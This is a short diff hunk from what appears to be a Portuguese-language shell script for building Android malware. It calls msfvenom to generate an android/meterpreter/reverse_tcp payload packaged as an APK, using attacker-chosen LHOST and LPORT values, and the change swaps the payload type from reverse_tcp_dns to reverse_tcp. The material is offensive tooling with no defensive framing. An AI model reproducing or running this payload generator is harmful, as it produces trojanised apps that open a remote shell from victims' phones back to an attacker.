@@ -197,7 +197,7 @@ echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
 
 echo -e "${CLARO}CRIANDO PAYLOAD..." ; msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost  LPORT=$lport R > $apk.apk 2>/dev/null
 clear
-PAYLOAD='android/meterpreter/reverse_tcp_dns'
+PAYLOAD='android/meterpreter/reverse_tcp'
 
 fi
 clear
